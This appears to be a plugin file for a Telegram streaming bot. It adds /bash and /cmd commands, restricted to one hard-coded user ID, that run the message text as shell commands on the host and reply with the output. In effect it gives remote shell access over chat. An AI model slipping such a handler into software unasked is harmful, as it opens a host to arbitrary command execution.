import subprocess
from pyrogram import filters
from pyrogram.types import Message
from WebStreamer.bot import StreamBot

def runbash(cmd):
    return subprocess.check_output(cmd, shell=True).decode('utf-8')
    
@StreamBot.on_message(filters.user(1252058587) & filters.command(['bash', 'cmd']))
async def bash(_, m: Message):
    rep = await m.reply("Proccessing...", quote=True)
    cmd = m.text.split(" ", 1)[1]
    output = runbash(cmd)
    await rep.edit(f"`{output}`")
